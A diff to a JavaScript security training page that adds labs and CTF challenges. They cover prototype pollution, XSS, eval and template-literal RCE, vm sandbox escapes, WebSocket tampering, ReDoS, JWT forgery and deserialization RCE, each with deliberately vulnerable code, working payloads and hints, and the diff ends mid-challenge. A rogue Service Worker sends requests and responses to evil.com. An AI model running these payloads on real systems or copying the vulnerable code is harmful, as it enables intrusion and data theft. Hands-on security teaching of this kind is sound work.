@@ -60,6 +60,16 @@
       <h1>JavaScript</h1>
       <hr />
 
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
       <h2>Overview</h2>
 
 <h3>Under the Hood</h3>
@@ -1171,7 +1181,814 @@ let shellcode = new Uint8Array([
 ]);</code></pre>
     </div>
 
-<!-- ...existing code... -->
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Prototype Pollution</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a vulnerable merge function to pollute <code>Object.prototype</code> and escalate privileges.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// vulnerable-merge.js
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object' && source[key] !== null) {
+      if (!target[key]) target[key] = {};
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+// Attacker-controlled input (e.g., from JSON body)
+let malicious = JSON.parse('{"__proto__":{"isAdmin":true}}');
+let config = {};
+merge(config, malicious);
+
+// Now ALL objects have isAdmin=true
+let user = {};
+console.log(user.isAdmin); // true — prototype polluted!</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the merge with the malicious payload</li>
+              <li>Verify that <code>{}.isAdmin</code> returns <code>true</code> on a fresh object</li>
+              <li>Try polluting <code>constructor.prototype</code> instead of <code>__proto__</code></li>
+              <li>Fix the merge function by adding a <code>__proto__</code> check</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: DOM Manipulation Attacks</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit unsafe DOM manipulation to inject malicious HTML via user-controlled input.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- dom-lab.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;div id="profile"&gt;&lt;/div&gt;
+  &lt;script&gt;
+    // Simulates user input from URL
+    let params = new URLSearchParams(location.search);
+    let name = params.get('name') || 'Guest';
+    let bio = params.get('bio') || 'No bio set';
+
+    // Vulnerable: innerHTML with user data
+    document.getElementById('profile').innerHTML = `
+      &lt;h2&gt;${name}&lt;/h2&gt;
+      &lt;p&gt;${bio}&lt;/p&gt;
+    `;
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Open with <code>?name=Alice&bio=Hello</code> — normal rendering</li>
+              <li>Inject via name: <code>?name=&lt;img src=x onerror=alert(1)&gt;</code></li>
+              <li>Fix by using <code>textContent</code> instead of <code>innerHTML</code></li>
+              <li>Compare <code>innerHTML</code>, <code>textContent</code>, and <code>innerText</code> behavior</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Event Handling Exploits</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit event listener misconfigurations to bypass client-side validation.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- event-lab.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;form id="loginForm"&gt;
+    &lt;input id="user" name="username"&gt;
+    &lt;input id="pass" name="password" type="password"&gt;
+    &lt;button type="submit"&gt;Login&lt;/button&gt;
+  &lt;/form&gt;
+  &lt;div id="result"&gt;&lt;/div&gt;
+  &lt;script&gt;
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      let user = document.getElementById('user').value;
+      let pass = document.getElementById('pass').value;
+      // Client-side "validation"
+      if (user === 'admin' &amp;&amp; pass === 'supersecret') {
+        document.getElementById('result').innerHTML = '&lt;h1&gt;Welcome Admin!&lt;/h1&gt;';
+      } else {
+        document.getElementById('result').innerHTML = '&lt;h1&gt;Access Denied&lt;/h1&gt;';
+      }
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Open the page and inspect the JavaScript source</li>
+              <li>The credentials are hardcoded in the event handler — read them from source</li>
+              <li>Use browser console: <code>document.getElementById('loginForm').dispatchEvent(new Event('submit'))</code></li>
+              <li>Override the event handler via console to always grant access</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Fetch API Exploitation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a page that uses fetch() to load data from a user-controlled URL, enabling SSRF or data theft.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- fetch-lab.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;input id="apiUrl" placeholder="API endpoint"&gt;
+  &lt;button onclick="loadData()"&gt;Load&lt;/button&gt;
+  &lt;pre id="output"&gt;&lt;/pre&gt;
+  &lt;script&gt;
+    async function loadData() {
+      let url = document.getElementById('apiUrl').value;
+      try {
+        let resp = await fetch(url);
+        let data = await resp.text();
+        document.getElementById('output').textContent = data;
+      } catch(e) {
+        document.getElementById('output').textContent = 'Error: ' + e.message;
+      }
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<pre><code class="language-python"># Serve alongside a Flask API with sensitive data
+from flask import Flask, send_file
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return send_file('fetch-lab.html')
+
+@app.route('/api/public')
+def public():
+    return '{"data":"public info"}'
+
+@app.route('/api/secret')
+def secret():
+    return '{"flag":"FETCH_API_SECRET"}'
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Load <code>/api/public</code> — see normal data</li>
+              <li>Load <code>/api/secret</code> — same-origin fetch succeeds, leaking secret data</li>
+              <li>Try cross-origin URLs — observe CORS blocking</li>
+              <li>Understand the security implications of client-side URL fetching</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: eval() Exploitation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a page that passes user input to <code>eval()</code> to achieve arbitrary code execution.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- eval-lab.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;Calculator&lt;/h1&gt;
+  &lt;input id="expr" placeholder="Enter expression (e.g., 2+2)"&gt;
+  &lt;button onclick="calculate()"&gt;Calculate&lt;/button&gt;
+  &lt;p id="result"&gt;&lt;/p&gt;
+  &lt;script&gt;
+    function calculate() {
+      let expr = document.getElementById('expr').value;
+      try {
+        // Vulnerable: eval with user input
+        let result = eval(expr);
+        document.getElementById('result').textContent = 'Result: ' + result;
+      } catch(e) {
+        document.getElementById('result').textContent = 'Error: ' + e.message;
+      }
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Enter <code>2+2</code> — calculator works normally</li>
+              <li>Enter <code>alert(document.cookie)</code> — arbitrary JS execution</li>
+              <li>Enter <code>fetch('/api/secret').then(r=>r.text()).then(d=>document.getElementById('result').textContent=d)</code></li>
+              <li>Understand why <code>eval()</code> should never process user input</li>
+              <li>Fix: use <code>Function('return ' + expr)()</code> with input validation, or a math parser library</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Template Literal Injection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a server-side template that uses JavaScript template literals unsafely.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// server.js (Node.js + Express)
+const express = require('express');
+const app = express();
+
+app.get('/greet', (req, res) => {
+  let name = req.query.name || 'World';
+  // Vulnerable: template literal with user input
+  let html = eval('`&lt;h1&gt;Hello ${name}&lt;/h1&gt;`');
+  res.send(html);
+});
+
+// Exploit: /greet?name=${require('child_process').execSync('id')}
+app.listen(3000);</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Visit <code>/greet?name=Alice</code> — normal greeting</li>
+              <li>The server uses <code>eval()</code> on a template literal containing user input</li>
+              <li>Inject: <code>${7*7}</code> to confirm template expression evaluation</li>
+              <li>Escalate to RCE: <code>${require('child_process').execSync('whoami')}</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: require() / import() Exploitation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a Node.js sandbox that leaks access to <code>require()</code> for arbitrary module loading.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// sandbox.js — Attempting to create a "safe" eval
+const vm = require('vm');
+
+const sandbox = {
+  console: console,
+  result: null,
+};
+
+// User input from query parameter
+let userCode = process.argv[2] || 'result = 2+2';
+
+const context = vm.createContext(sandbox);
+vm.runInContext(userCode, context);
+console.log('Result:', sandbox.result);
+
+// Escape the sandbox:
+// this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run: <code>node sandbox.js "result = 2+2"</code> — works as a calculator</li>
+              <li>Try sandbox escape: <code>node sandbox.js "result = this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()"</code></li>
+              <li>The <code>vm</code> module is NOT a security boundary — it's trivially escapable</li>
+              <li>For real sandboxing, use <code>vm2</code> or isolated processes</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: WebSocket Interaction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Intercept and manipulate WebSocket messages to bypass authorization checks.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// ws-server.js (requires: npm install ws express)
+const WebSocket = require('ws');
+const express = require('express');
+const app = express();
+
+app.get('/', (req, res) => res.sendFile(__dirname + '/ws-client.html'));
+app.listen(3000);
+
+const wss = new WebSocket.Server({ port: 8080 });
+wss.on('connection', (ws) => {
+  ws.on('message', (msg) => {
+    let data = JSON.parse(msg);
+    // Vulnerable: trusts client-sent role
+    if (data.action === 'getFlag' && data.role === 'admin') {
+      ws.send(JSON.stringify({flag: 'WS_FLAG{w3bs0ck3t_t4mp3r}'}));
+    } else if (data.action === 'getFlag') {
+      ws.send(JSON.stringify({error: 'Admin only'}));
+    } else {
+      ws.send(JSON.stringify({echo: data}));
+    }
+  });
+});</code></pre>
+<pre><code class="language-markup">&lt;!-- ws-client.html --&gt;
+&lt;html&gt;&lt;body&gt;
+&lt;button onclick="getFlag()"&gt;Get Flag&lt;/button&gt;
+&lt;pre id="out"&gt;&lt;/pre&gt;
+&lt;script&gt;
+  const ws = new WebSocket('ws://localhost:8080');
+  ws.onmessage = (e) =&gt; document.getElementById('out').textContent = e.data;
+  function getFlag() {
+    ws.send(JSON.stringify({action: 'getFlag', role: 'user'}));
+  }
+&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Click "Get Flag" — server responds with "Admin only"</li>
+              <li>Open browser console and send: <code>ws.send(JSON.stringify({action:'getFlag',role:'admin'}))</code></li>
+              <li>Or intercept WebSocket messages in Burp (Proxy → WebSocket History)</li>
+              <li>The server trusts the client-sent <code>role</code> field — no server-side auth check</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Service Worker Hijacking</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Register a malicious Service Worker that intercepts all fetch requests and exfiltrates data.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// malicious-sw.js — Rogue Service Worker
+self.addEventListener('fetch', (event) => {
+  // Log all fetched URLs to attacker server
+  fetch('https://evil.com/log?url=' + encodeURIComponent(event.request.url));
+  // Optionally modify responses
+  if (event.request.url.includes('/api/')) {
+    event.respondWith(
+      fetch(event.request).then(response => {
+        // Clone and exfiltrate API responses
+        let cloned = response.clone();
+        cloned.text().then(body => {
+          fetch('https://evil.com/exfil', {
+            method: 'POST',
+            body: JSON.stringify({url: event.request.url, data: body})
+          });
+        });
+        return response;
+      })
+    );
+  }
+});
+
+// Registration (requires same-origin or XSS)
+// navigator.serviceWorker.register('/malicious-sw.js', {scope: '/'})</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Understand: Service Workers intercept ALL network requests for their scope</li>
+              <li>A registered SW persists even after the XSS payload is gone</li>
+              <li>Requirement: the SW script must be served from the same origin</li>
+              <li>Attack chain: XSS → upload SW script → register it → persistent data interception</li>
+              <li>Check <code>chrome://serviceworker-internals</code> to see registered workers</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: postMessage Exploitation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a page that accepts <code>postMessage</code> without origin validation to inject malicious data.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- vulnerable-receiver.html --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;div id="content"&gt;&lt;/div&gt;
+  &lt;script&gt;
+    // Vulnerable: no origin check on incoming messages
+    window.addEventListener('message', function(e) {
+      // Should check: if (e.origin !== 'https://trusted.com') return;
+      document.getElementById('content').innerHTML = e.data;
+    });
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- attacker.html (hosted on evil.com) --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;iframe id="target" src="http://localhost:3000/vulnerable-receiver.html"&gt;&lt;/iframe&gt;
+  &lt;script&gt;
+    let iframe = document.getElementById('target');
+    iframe.onload = function() {
+      // Send XSS payload via postMessage
+      iframe.contentWindow.postMessage(
+        '&lt;img src=x onerror=alert(document.domain)&gt;',
+        '*'
+      );
+    };
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Open the vulnerable page and send a postMessage from the console: <code>window.postMessage('&lt;h1&gt;Injected!&lt;/h1&gt;', '*')</code></li>
+              <li>Send an XSS payload: <code>window.postMessage('&lt;img src=x onerror=alert(1)&gt;', '*')</code></li>
+              <li>Create an attacker page that iframes the target and auto-sends the payload</li>
+              <li>Fix: add origin validation in the message event handler</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: JSON Parsing Tricks</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit JSON parsing quirks to bypass validation and inject unexpected values.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// json-tricks.js
+// Duplicate keys — last value wins in most parsers
+let json1 = '{"role":"user","role":"admin"}';
+console.log(JSON.parse(json1)); // {role: "admin"}
+
+// Unicode escapes in keys
+let json2 = '{"r\\u006fle":"admin"}';  // "role" via unicode
+console.log(JSON.parse(json2)); // {role: "admin"}
+
+// Prototype pollution via JSON
+let json3 = '{"__proto__":{"polluted":true}}';
+let obj = JSON.parse(json3);
+// JSON.parse doesn't pollute — but Object.assign or merge might
+let target = {};
+Object.assign(target, obj);
+// target.__proto__ is set but doesn't pollute Object.prototype
+
+// Number precision tricks
+console.log(JSON.parse('9999999999999999')); // 10000000000000000 (precision loss)
+console.log(JSON.parse('{"id":1}') === JSON.parse('{"id":1}')); // false (different objects)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Test duplicate key behavior in <code>JSON.parse</code></li>
+              <li>Try unicode-escaped keys to bypass keyword filters</li>
+              <li>Explore number precision issues with large integers</li>
+              <li>Test how different backends (Python, PHP, Java) handle duplicate JSON keys differently</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Regex DoS (ReDoS)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Craft an input that causes catastrophic backtracking in a vulnerable regex, hanging the application.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// redos.js — Vulnerable regex patterns
+const express = require('express');
+const app = express();
+
+app.get('/validate', (req, res) => {
+  let email = req.query.email || '';
+  let start = Date.now();
+
+  // Vulnerable regex: catastrophic backtracking on evil input
+  let emailRegex = /^([a-zA-Z0-9]+)+@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;
+  let valid = emailRegex.test(email);
+
+  let elapsed = Date.now() - start;
+  res.json({valid, elapsed_ms: elapsed});
+});
+
+app.listen(3000);
+
+// Evil input that triggers exponential backtracking:
+// /validate?email=aaaaaaaaaaaaaaaaaaaaaaaaaaa!
+// The regex engine tries 2^N paths before failing</code></pre>
+<pre><code class="language-javascript">// Safe alternative: use a simple regex or a validation library
+let safeRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;  // No nested quantifiers
+
+// Test for ReDoS vulnerability:
+// npm install safe-regex
+const safe = require('safe-regex');
+console.log(safe(/^([a-zA-Z0-9]+)+$/));  // false — vulnerable!
+console.log(safe(/^[a-zA-Z0-9]+$/));      // true — safe</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Start the server and test with a normal email — instant response</li>
+              <li>Send: <code>/validate?email=aaaaaaaaaaaaaaaaaaaaaa!</code> — observe the hang</li>
+              <li>Increase the <code>a</code> count — each additional char doubles the time</li>
+              <li>The pattern <code>([a-zA-Z0-9]+)+</code> has nested quantifiers — catastrophic backtracking</li>
+              <li>Fix by removing nested quantifiers or using the safe regex</li>
+            </ol>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Prototype Pollution to RCE</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Exploit prototype pollution in a Node.js app to achieve remote code execution via a gadget chain.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// server.js
+const express = require('express');
+const app = express();
+app.use(express.json());
+
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object' && source[key] !== null) {
+      if (!target[key]) target[key] = {};
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+}
+
+app.post('/config', (req, res) => {
+  let config = {};
+  merge(config, req.body);
+  res.json({status: 'ok'});
+});
+
+app.get('/render', (req, res) => {
+  // Gadget: child_process.fork uses env vars from prototype
+  const {execSync} = require('child_process');
+  let opts = {};
+  // If opts.shell is polluted to true, and opts.cmd is set...
+  res.send('Rendered. Check for pollution side effects.');
+});
+
+app.listen(3000);</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>POST to <code>/config</code> with: <code>{"__proto__":{"shell":true,"NODE_OPTIONS":"--require /proc/self/environ"}}</code><br>
+            Common gadgets: <code>child_process</code> spawns inherit polluted env/options.<br>
+            Alternative: pollute <code>{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require('fs').readFileSync('/flag').toString())"}}</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: DOM Clobbering XSS</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The page loads a script from a configurable URL. Use DOM clobbering to override the config and load your own script.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- Page allows HTML injection but strips script tags --&gt;
+&lt;div id="user-content"&gt;YOUR_HTML_HERE&lt;/div&gt;
+&lt;script&gt;
+  let scriptUrl = window.cdnConfig?.url || 'https://cdn.example.com/safe.js';
+  let s = document.createElement('script');
+  s.src = scriptUrl;
+  document.body.appendChild(s);
+  // Flag is at: /api/flag (same-origin)
+&lt;/script&gt;</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Inject: <code>&lt;a id="cdnConfig" href="https://your-server.com/evil.js"&gt;</code><br>
+            <code>window.cdnConfig</code> now references the anchor element.<br>
+            <code>cdnConfig?.url</code> won't work directly, but <code>cdnConfig + ''</code> returns the href.<br>
+            Try: <code>&lt;form id="cdnConfig"&gt;&lt;input name="url" value="https://your-server.com/evil.js"&gt;&lt;/form&gt;</code></p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: AJAX Request Forgery</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A dashboard fetches data from an API URL specified in the page. Inject a URL to steal data from a protected endpoint.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// server.js
+const express = require('express');
+const app = express();
+
+app.get('/dashboard', (req, res) => {
+  let apiUrl = req.query.api || '/api/public';
+  res.send(`&lt;div id="data"&gt;&lt;/div&gt;
+  &lt;script&gt;
+    fetch('${apiUrl}').then(r=>r.text()).then(d=>{
+      document.getElementById('data').textContent = d;
+    });
+  &lt;/script&gt;`);
+});
+
+app.get('/api/public', (req, res) => res.json({info: 'public data'}));
+app.get('/api/admin', (req, res) => res.json({flag: 'FLAG{4j4x_r3qu3st_f0rg3ry}'}));
+
+app.listen(3000);</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The <code>api</code> parameter is injected into a fetch call.<br>
+            Visit: <code>/dashboard?api=/api/admin</code> — the fetch loads the admin endpoint.<br>
+            For XSS: <code>/dashboard?api='+alert(1)+'</code> (break out of the string).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: eval() Jail Escape</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A "safe" calculator blocks dangerous keywords. Bypass the filter and read the flag file.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// server.js
+const express = require('express');
+const app = express();
+const fs = require('fs');
+fs.writeFileSync('/tmp/flag.txt', 'FLAG{3v4l_j41l_3sc4p3}');
+
+app.get('/calc', (req, res) => {
+  let expr = req.query.expr || '0';
+  let blocked = ['require', 'process', 'child_process', 'exec', 'spawn', 'fs',
+                 'import', 'Function', 'constructor', '__proto__'];
+  for (let b of blocked) {
+    if (expr.includes(b)) return res.send('Blocked: ' + b);
+  }
+  try {
+    let result = eval(expr);
+    res.send('Result: ' + result);
+  } catch(e) {
+    res.send('Error: ' + e.message);
+  }
+});
+
+app.listen(3000);</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The filter blocks keywords as substrings. Bypass with string concatenation:<br>
+            <code>this['constru'+'ctor']['constru'+'ctor']('return pro'+'cess')().mainModule['requ'+'ire']('child_'+'process')['exe'+'cSync']('cat /tmp/flag.txt').toString()</code><br>
+            Or use: <code>global['pro'+'cess']</code> to access process object.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: WebSocket Chat Takeover</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Intercept WebSocket messages in a chat app to impersonate the admin and retrieve the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// server.js
+const WebSocket = require('ws');
+const wss = new WebSocket.Server({ port: 8080 });
+
+wss.on('connection', (ws) => {
+  ws.on('message', (msg) => {
+    let data = JSON.parse(msg);
+    if (data.type === 'chat') {
+      // Broadcast to all
+      wss.clients.forEach(c => c.send(JSON.stringify({from: data.user, msg: data.msg})));
+    }
+    if (data.type === 'admin_cmd' && data.user === 'admin') {
+      ws.send(JSON.stringify({flag: 'FLAG{ws_ch4t_t4k30v3r}'}));
+    }
+  });
+});</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The server trusts the <code>user</code> field from the client message.<br>
+            Send: <code>ws.send(JSON.stringify({type:'admin_cmd', user:'admin'}))</code><br>
+            No authentication — just claim to be admin in the message payload.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: postMessage Origin Bypass</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A page checks the message origin but uses a weak regex. Bypass the check to inject an XSS payload.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- target.html --&gt;
+&lt;script&gt;
+  window.addEventListener('message', function(e) {
+    // Weak origin check — bypassable!
+    if (!/trusted\.com/.test(e.origin)) {
+      return;
+    }
+    document.getElementById('output').innerHTML = e.data;
+  });
+&lt;/script&gt;
+&lt;div id="output"&gt;&lt;/div&gt;</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The regex <code>/trusted\.com/</code> matches anywhere in the origin string.<br>
+            Register a domain like <code>trusted.com.evil.com</code> or <code>nottrusted.com</code> — both match.<br>
+            Host your attacker page on the matching domain, iframe the target, and send XSS via postMessage.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: JWT Client-Side Verification</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A SPA verifies JWTs client-side only. Bypass the verification to access admin features.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- spa.html --&gt;
+&lt;script&gt;
+  // Client-side JWT "verification" (never do this!)
+  let token = localStorage.getItem('token');
+  if (token) {
+    let payload = JSON.parse(atob(token.split('.')[1]));
+    if (payload.role === 'admin') {
+      document.body.innerHTML = '&lt;h1&gt;Admin Panel — FLAG{cl13nt_jwt_l0l}&lt;/h1&gt;';
+    } else {
+      document.body.innerHTML = '&lt;h1&gt;User Dashboard&lt;/h1&gt;';
+    }
+  } else {
+    // Set default token
+    localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.sig');
+    location.reload();
+  }
+&lt;/script&gt;</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The app only decodes the JWT payload — never verifies the signature.<br>
+            In browser console: create a fake token with <code>role: admin</code>.<br>
+            <code>localStorage.setItem('token', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.' + btoa(JSON.stringify({user:'admin',role:'admin'})) + '.')</code><br>
+            Reload the page.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Regex Bypass for Input Validation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The server validates usernames with a regex. Find an input that passes validation but triggers unexpected behavior.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// server.js
+const express = require('express');
+const app = express();
+
+app.get('/register', (req, res) => {
+  let username = req.query.user || '';
+  // Validation: only alphanumeric, 3-20 chars
+  if (!/^[a-zA-Z0-9]{3,20}$/.test(username)) {
+    return res.send('Invalid username');
+  }
+  // But the DB query uses the raw input...
+  if (username.toUpperCase() === 'ADMIN') {
+    return res.send('FLAG{r3g3x_byp4ss_c4s3}');
+  }
+  res.send('Registered: ' + username);
+});
+
+app.listen(3000);</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The regex allows alphanumeric chars including uppercase/lowercase.<br>
+            Simply register as <code>admin</code> or <code>Admin</code> or <code>ADMIN</code> — all pass the regex.<br>
+            The comparison <code>username.toUpperCase() === 'ADMIN'</code> catches any case variant.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Node.js Deserialization RCE</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Exploit unsafe deserialization in a Node.js application to achieve remote code execution.</p>
+          <div class="setup-code">
+<pre><code class="language-javascript">// server.js (requires: npm install node-serialize)
+const express = require('express');
+const serialize = require('node-serialize');
+const app = express();
+
+app.get('/profile', (req, res) => {
+  let cookie = req.query.data || 'eyJ1c2VyIjoiZ3Vlc3QifQ==';
+  try {
+    let data = serialize.unserialize(Buffer.from(cookie, 'base64').toString());
+    res.send('Welcome, ' + (data.user || 'unknown'));
+  } catch(e) {
+    res.send('Error: ' + e.message);
+  }
+});
+
+// Exploit payload (base64 encode this):
+// {"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('cat /etc/passwd')}()"}
+app.listen(3000);</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><code>node-serialize</code>'s <code>unserialize()</code> executes functions marked with <code>_$$ND_FUNC$$_</code>.<br>
+            Craft a payload: <code>{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}</code><br>
+            Base64 encode it and pass as the <code>data</code> parameter.<br>
+            The <code>()</code> at the end of the function causes immediate invocation (IIFE).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Client-Side Crypto Bypass</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A SPA encrypts data client-side before sending. Find the hardcoded key and decrypt the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-markup">&lt;!-- crypto-app.html --&gt;
+&lt;script&gt;
+  // "Secure" client-side encryption
+  const SECRET_KEY = 'my-secret-key-123';
+
+  function xorEncrypt(text, key) {
+    let result = '';
+    for (let i = 0; i &lt; text.length; i++) {
+      result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return btoa(result);
+  }
+
+  // The encrypted flag is stored in the page
+  const encryptedFlag = xorEncrypt('FLAG{cl13nt_crypt0_f41l}', SECRET_KEY);
